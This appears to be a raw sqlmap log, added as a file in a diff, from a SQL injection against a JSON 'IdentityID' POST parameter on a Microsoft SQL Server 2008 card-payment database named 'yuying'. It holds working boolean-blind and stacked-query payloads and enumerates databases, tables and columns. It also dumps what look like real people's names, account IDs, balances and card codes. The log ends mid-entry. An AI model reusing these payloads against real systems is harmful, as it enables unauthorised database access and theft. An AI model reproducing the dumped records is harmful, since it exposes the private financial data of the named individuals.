@@ -1,0 +1,2423 @@
+sqlmap identified the following injection point(s) with a total of 58 HTTP(s) requests:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+available databases [7]:
+[*] master
+[*] model
+[*] msdb
+[*] ReportServer
+[*] ReportServerTempDB
+[*] tempdb
+[*] yuying
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+[53 tables]
++-------------------------+
+| AccBalan                |
+| AccDeposit              |
+| AddCard                 |
+| Bu_Acco_info            |
+| CardDeposit             |
+| ClientSet               |
+| DayPlan                 |
+| DealCard                |
+| DeptSet                 |
+| FixPrice2               |
+| GetData                 |
+| GroupSet                |
+| Level1                  |
+| LevelRight              |
+| LossCard                |
+| Main                    |
+| Main_Temp               |
+| Main_bak                |
+| ManType                 |
+| Modal1                  |
+| Persons                 |
+| SendData                |
+| SubsidizeRd             |
+| Tbl_Details             |
+| TmpAllCons13            |
+| TmpAllCons14            |
+| TmpAllCons15            |
+| TmpAllCons16            |
+| TmpAllCons17            |
+| TmpAllCons18            |
+| TmpSale                 |
+| UserLogm                |
+| V_Details               |
+| V_PersonInfo            |
+| accperson               |
+| archive                 |
+| autobt                  |
+| constimset              |
+| dayconsume              |
+| dealmoney               |
+| dtproperties            |
+| mealconsume             |
+| oldcardcode             |
+| serverinfo              |
+| sf98Para                |
+| t00                     |
+| tbl_Archive_Log         |
+| tbl_Archive_LogSuc      |
+| tbl_Receive_Log         |
+| tbl_Receive_Log20171021 |
+| temp_ConsumeRecord      |
+| tmpconsume              |
+| userdept                |
++-------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+available databases [7]:
+[*] master
+[*] model
+[*] msdb
+[*] ReportServer
+[*] ReportServerTempDB
+[*] tempdb
+[*] yuying
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+available databases [7]:
+[*] master
+[*] model
+[*] msdb
+[*] ReportServer
+[*] ReportServerTempDB
+[*] tempdb
+[*] yuying
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+Table: DealCard
+[14 columns]
++-----------+----------+
+| Column    | Type     |
++-----------+----------+
+| balanmark | nvarchar |
+| cardtype  | nvarchar |
+| DealDate  | nvarchar |
+| DealTime  | nvarchar |
+| GBF       | money    |
+| ID        | nvarchar |
+| Money0    | money    |
+| Name      | nvarchar |
+| NewCode   | nvarchar |
+| OldCode   | nvarchar |
+| Persons   | nvarchar |
+| sign      | nvarchar |
+| sn        | char     |
+| userdept  | nvarchar |
++-----------+----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+Table: DealCard
+[2 entries]
++------+--------+
+| Name | Money0 |
++------+--------+
+| 张子睿  | 233.40 |
+| 张怡然  | 111.20 |
++------+--------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+Table: DealCard
+[14 columns]
++-----------+----------+
+| Column    | Type     |
++-----------+----------+
+| balanmark | nvarchar |
+| cardtype  | nvarchar |
+| DealDate  | nvarchar |
+| DealTime  | nvarchar |
+| GBF       | money    |
+| ID        | nvarchar |
+| Money0    | money    |
+| Name      | nvarchar |
+| NewCode   | nvarchar |
+| OldCode   | nvarchar |
+| Persons   | nvarchar |
+| sign      | nvarchar |
+| sn        | char     |
+| userdept  | nvarchar |
++-----------+----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+[53 tables]
++-------------------------+
+| AccBalan                |
+| AccDeposit              |
+| AddCard                 |
+| Bu_Acco_info            |
+| CardDeposit             |
+| ClientSet               |
+| DayPlan                 |
+| DealCard                |
+| DeptSet                 |
+| FixPrice2               |
+| GetData                 |
+| GroupSet                |
+| Level1                  |
+| LevelRight              |
+| LossCard                |
+| Main                    |
+| Main_Temp               |
+| Main_bak                |
+| ManType                 |
+| Modal1                  |
+| Persons                 |
+| SendData                |
+| SubsidizeRd             |
+| Tbl_Details             |
+| TmpAllCons13            |
+| TmpAllCons14            |
+| TmpAllCons15            |
+| TmpAllCons16            |
+| TmpAllCons17            |
+| TmpAllCons18            |
+| TmpSale                 |
+| UserLogm                |
+| V_Details               |
+| V_PersonInfo            |
+| accperson               |
+| archive                 |
+| autobt                  |
+| constimset              |
+| dayconsume              |
+| dealmoney               |
+| dtproperties            |
+| mealconsume             |
+| oldcardcode             |
+| serverinfo              |
+| sf98Para                |
+| t00                     |
+| tbl_Archive_Log         |
+| tbl_Archive_LogSuc      |
+| tbl_Receive_Log         |
+| tbl_Receive_Log20171021 |
+| temp_ConsumeRecord      |
+| tmpconsume              |
+| userdept                |
++-------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+Table: Main
+[27 columns]
++---------------+----------+
+| Column        | Type     |
++---------------+----------+
+| Allowance     | money    |
+| AllowMark     | nvarchar |
+| CardCode      | nvarchar |
+| CardType      | nvarchar |
+| ConsDate      | nvarchar |
+| ConsRight     | nvarchar |
+| dayconsflag   | nvarchar |
+| Deposit       | money    |
+| depositflag   | nvarchar |
+| Gbf           | money    |
+| ID            | nvarchar |
+| IdentityID    | nvarchar |
+| IdentityNo    | nvarchar |
+| Manage        | smallint |
+| MaxCons       | real     |
+| Money0        | money    |
+| monthconsflag | nvarchar |
+| Name          | nvarchar |
+| OpenDate      | nvarchar |
+| PassW         | nvarchar |
+| PersonType    | nvarchar |
+| PS_ID         | nvarchar |
+| Sex           | nvarchar |
+| sn            | char     |
+| State         | nvarchar |
+| timelimit     | nvarchar |
+| userdept      | nvarchar |
++---------------+----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+Table: Main
+[26 entries]
++--------+
+| Manage |
++--------+
+| 0      |
+| 0      |
+| 0      |
+| 0      |
+| 0      |
+| 0      |
+| 0      |
+| 0      |
+| 0      |
+| 0      |
+| 0      |
+| 0      |
+| 0      |
+| 0      |
+| 0      |
+| 0      |
+| 0      |
+| 0      |
+| 0      |
+| 0      |
+| 0      |
+| 0      |
+| 0      |
+| 0      |
+| 0      |
+| 0      |
++--------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+Table: Main
+[27 columns]
++---------------+----------+
+| Column        | Type     |
++---------------+----------+
+| Allowance     | money    |
+| AllowMark     | nvarchar |
+| CardCode      | nvarchar |
+| CardType      | nvarchar |
+| ConsDate      | nvarchar |
+| ConsRight     | nvarchar |
+| dayconsflag   | nvarchar |
+| Deposit       | money    |
+| depositflag   | nvarchar |
+| Gbf           | money    |
+| ID            | nvarchar |
+| IdentityID    | nvarchar |
+| IdentityNo    | nvarchar |
+| Manage        | smallint |
+| MaxCons       | real     |
+| Money0        | money    |
+| monthconsflag | nvarchar |
+| Name          | nvarchar |
+| OpenDate      | nvarchar |
+| PassW         | nvarchar |
+| PersonType    | nvarchar |
+| PS_ID         | nvarchar |
+| Sex           | nvarchar |
+| sn            | char     |
+| State         | nvarchar |
+| timelimit     | nvarchar |
+| userdept      | nvarchar |
++---------------+----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+Table: Main
+[5 entries]
++------------+------+---------+
+| ID         | Name | Money   |
++------------+------+---------+
+| JS328      | 陈艳丽  | <blank> |
+| JS250      | 杨冬梅  | <blank> |
+| JS252      | 张育红  | <blank> |
+| JS253      | 刘红岩  | <blank> |
+| 2013061271 | 姚俊兰  | <blank> |
++------------+------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+Table: Main
+[12 entries]
++---------------+---------+---------+
+| ID            | Name    | Money0  |
++---------------+---------+---------+
+| JS328         | 陈艳丽     | 7252.90 |
+| JS250         | 杨冬梅     | 1874.70 |
+| JS252         | 张育红     | 1.20    |
+| JS253         | 刘红岩     | 3020.06 |
+| 2013061271    | 姚俊兰     | 0.00    |
+| JS258         | 赵娜      | 2622.40 |
+| JS260         | 李建华     | 2242.90 |
+| 2013061272    | 西配楼维修通卡 | 0.00    |
+| SX20170310001 | 蔡文远     | 1617.24 |
+| JS263         | 何丽丽     | 1305.23 |
+| JS20170217001 | 韩寅生     | 2151.19 |
+| JS20170613001 | 刘娟娟     | 935.60  |
++---------------+---------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+Table: Main
+[27 columns]
++---------------+----------+
+| Column        | Type     |
++---------------+----------+
+| Allowance     | money    |
+| AllowMark     | nvarchar |
+| CardCode      | nvarchar |
+| CardType      | nvarchar |
+| ConsDate      | nvarchar |
+| ConsRight     | nvarchar |
+| dayconsflag   | nvarchar |
+| Deposit       | money    |
+| depositflag   | nvarchar |
+| Gbf           | money    |
+| ID            | nvarchar |
+| IdentityID    | nvarchar |
+| IdentityNo    | nvarchar |
+| Manage        | smallint |
+| MaxCons       | real     |
+| Money0        | money    |
+| monthconsflag | nvarchar |
+| Name          | nvarchar |
+| OpenDate      | nvarchar |
+| PassW         | nvarchar |
+| PersonType    | nvarchar |
+| PS_ID         | nvarchar |
+| Sex           | nvarchar |
+| sn            | char     |
+| State         | nvarchar |
+| timelimit     | nvarchar |
+| userdept      | nvarchar |
++---------------+----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+Table: Main
+[5 entries]
++------------+------+---------+------------+
+| ID         | Name | Money0  | IdentityNo |
++------------+------+---------+------------+
+| JS328      | 陈艳丽  | 7252.90 | JS328      |
+| JS250      | 杨冬梅  | 1874.70 | JS250      |
+| JS252      | 张育红  | 1.20    | JS252      |
+| JS253      | 刘红岩  | 3020.06 | JS253      |
+| 2013061271 | 姚俊兰  | 0.00    | 2013061271 |
++------------+------+---------+------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+Table: Main
+[27 columns]
++---------------+----------+
+| Column        | Type     |
++---------------+----------+
+| Allowance     | money    |
+| AllowMark     | nvarchar |
+| CardCode      | nvarchar |
+| CardType      | nvarchar |
+| ConsDate      | nvarchar |
+| ConsRight     | nvarchar |
+| dayconsflag   | nvarchar |
+| Deposit       | money    |
+| depositflag   | nvarchar |
+| Gbf           | money    |
+| ID            | nvarchar |
+| IdentityID    | nvarchar |
+| IdentityNo    | nvarchar |
+| Manage        | smallint |
+| MaxCons       | real     |
+| Money0        | money    |
+| monthconsflag | nvarchar |
+| Name          | nvarchar |
+| OpenDate      | nvarchar |
+| PassW         | nvarchar |
+| PersonType    | nvarchar |
+| PS_ID         | nvarchar |
+| Sex           | nvarchar |
+| sn            | char     |
+| State         | nvarchar |
+| timelimit     | nvarchar |
+| userdept      | nvarchar |
++---------------+----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+Table: Main
+[13 entries]
++---------------+---------+---------+------------+
+| ID            | Name    | Money0  | IdentityID |
++---------------+---------+---------+------------+
+| JS328         | 陈艳丽     | 7252.90 | <blank>    |
+| JS250         | 杨冬梅     | 1874.70 | <blank>    |
+| JS252         | 张育红     | 1.20    | <blank>    |
+| JS253         | 刘红岩     | 3020.06 | <blank>    |
+| 2013061271    | 姚俊兰     | 0.00    | <blank>    |
+| JS258         | 赵娜      | 2622.40 | <blank>    |
+| JS260         | 李建华     | 2242.90 | <blank>    |
+| 2013061272    | 西配楼维修通卡 | 0.00    | <blank>    |
+| SX20170310001 | 蔡文远     | 1617.24 | <blank>    |
+| JS263         | 何丽丽     | 1305.23 | <blank>    |
+| JS20170217001 | 韩寅生     | 2151.19 | <blank>    |
+| JS20170613001 | 刘娟娟     | 935.60  | <blank>    |
+| 2013061273    | 0.00    | <blank>    |
++---------------+---------+---------+------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+Table: Main
+[27 columns]
++---------------+----------+
+| Column        | Type     |
++---------------+----------+
+| Allowance     | money    |
+| AllowMark     | nvarchar |
+| CardCode      | nvarchar |
+| CardType      | nvarchar |
+| ConsDate      | nvarchar |
+| ConsRight     | nvarchar |
+| dayconsflag   | nvarchar |
+| Deposit       | money    |
+| depositflag   | nvarchar |
+| Gbf           | money    |
+| ID            | nvarchar |
+| IdentityID    | nvarchar |
+| IdentityNo    | nvarchar |
+| Manage        | smallint |
+| MaxCons       | real     |
+| Money0        | money    |
+| monthconsflag | nvarchar |
+| Name          | nvarchar |
+| OpenDate      | nvarchar |
+| PassW         | nvarchar |
+| PersonType    | nvarchar |
+| PS_ID         | nvarchar |
+| Sex           | nvarchar |
+| sn            | char     |
+| State         | nvarchar |
+| timelimit     | nvarchar |
+| userdept      | nvarchar |
++---------------+----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+Table: Main
+[14 entries]
++---------------+---------+---------+------------+
+| ID            | Name    | Money0  | CardCode   |
++---------------+---------+---------+------------+
+| JS328         | 陈艳丽     | 7252.90 | 2943295996 |
+| JS250         | 杨冬梅     | 1874.70 | 2942904124 |
+| JS252         | 张育红     | 1.20    | 0505086987 |
+| JS253         | 刘红岩     | 3020.06 | 0504888891 |
+| 2013061271    | 姚俊兰     | 0.00    | 0504942075 |
+| JS258         | 赵娜      | 2622.40 | 1834932348 |
+| JS260         | 李建华     | 2242.90 | 2455940236 |
+| 2013061272    | 西配楼维修通卡 | 0.00    | 0505033835 |
+| SX20170310001 | 蔡文远     | 1617.24 | 1834586204 |
+| JS263         | 何丽丽     | 1305.23 | 1834509580 |
+| JS20170217001 | 韩寅生     | 2151.19 | 2943072988 |
+| JS20170613001 | 刘娟娟     | 935.60  | 1834508108 |
+| 2013061273    | 程莉门禁    | 0.00    | 0504939963 |
+| JS20170220001 | 韩笑      | 1177.15 | 3729232901 |
++---------------+---------+---------+------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+Table: Main
+[27 columns]
++---------------+----------+
+| Column        | Type     |
++---------------+----------+
+| Allowance     | money    |
+| AllowMark     | nvarchar |
+| CardCode      | nvarchar |
+| CardType      | nvarchar |
+| ConsDate      | nvarchar |
+| ConsRight     | nvarchar |
+| dayconsflag   | nvarchar |
+| Deposit       | money    |
+| depositflag   | nvarchar |
+| Gbf           | money    |
+| ID            | nvarchar |
+| IdentityID    | nvarchar |
+| IdentityNo    | nvarchar |
+| Manage        | smallint |
+| MaxCons       | real     |
+| Money0        | money    |
+| monthconsflag | nvarchar |
+| Name          | nvarchar |
+| OpenDate      | nvarchar |
+| PassW         | nvarchar |
+| PersonType    | nvarchar |
+| PS_ID         | nvarchar |
+| Sex           | nvarchar |
+| sn            | char     |
+| State         | nvarchar |
+| timelimit     | nvarchar |
+| userdept      | nvarchar |
++---------------+----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+[53 tables]
++-------------------------+
+| AccBalan                |
+| AccDeposit              |
+| AddCard                 |
+| Bu_Acco_info            |
+| CardDeposit             |
+| ClientSet               |
+| DayPlan                 |
+| DealCard                |
+| DeptSet                 |
+| FixPrice2               |
+| GetData                 |
+| GroupSet                |
+| Level1                  |
+| LevelRight              |
+| LossCard                |
+| Main                    |
+| Main_Temp               |
+| Main_bak                |
+| ManType                 |
+| Modal1                  |
+| Persons                 |
+| SendData                |
+| SubsidizeRd             |
+| Tbl_Details             |
+| TmpAllCons13            |
+| TmpAllCons14            |
+| TmpAllCons15            |
+| TmpAllCons16            |
+| TmpAllCons17            |
+| TmpAllCons18            |
+| TmpSale                 |
+| UserLogm                |
+| V_Details               |
+| V_PersonInfo            |
+| accperson               |
+| archive                 |
+| autobt                  |
+| constimset              |
+| dayconsume              |
+| dealmoney               |
+| dtproperties            |
+| mealconsume             |
+| oldcardcode             |
+| serverinfo              |
+| sf98Para                |
+| t00                     |
+| tbl_Archive_Log         |
+| tbl_Archive_LogSuc      |
+| tbl_Receive_Log         |
+| tbl_Receive_Log20171021 |
+| temp_ConsumeRecord      |
+| tmpconsume              |
+| userdept                |
++-------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+Table: serverinfo
+[5 columns]
++---------------+----------+
+| Column        | Type     |
++---------------+----------+
+| clientip      | nvarchar |
+| clientname    | nvarchar |
+| clientno      | char     |
+| inclientprot  | nvarchar |
+| outclientprot | nvarchar |
++---------------+----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+Table: serverinfo
+[0 entries]
++------------+
+| clientname |
++------------+
++------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+Table: Main
+[27 columns]
++---------------+----------+
+| Column        | Type     |
++---------------+----------+
+| Allowance     | money    |
+| AllowMark     | nvarchar |
+| CardCode      | nvarchar |
+| CardType      | nvarchar |
+| ConsDate      | nvarchar |
+| ConsRight     | nvarchar |
+| dayconsflag   | nvarchar |
+| Deposit       | money    |
+| depositflag   | nvarchar |
+| Gbf           | money    |
+| ID            | nvarchar |
+| IdentityID    | nvarchar |
+| IdentityNo    | nvarchar |
+| Manage        | smallint |
+| MaxCons       | real     |
+| Money0        | money    |
+| monthconsflag | nvarchar |
+| Name          | nvarchar |
+| OpenDate      | nvarchar |
+| PassW         | nvarchar |
+| PersonType    | nvarchar |
+| PS_ID         | nvarchar |
+| Sex           | nvarchar |
+| sn            | char     |
+| State         | nvarchar |
+| timelimit     | nvarchar |
+| userdept      | nvarchar |
++---------------+----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
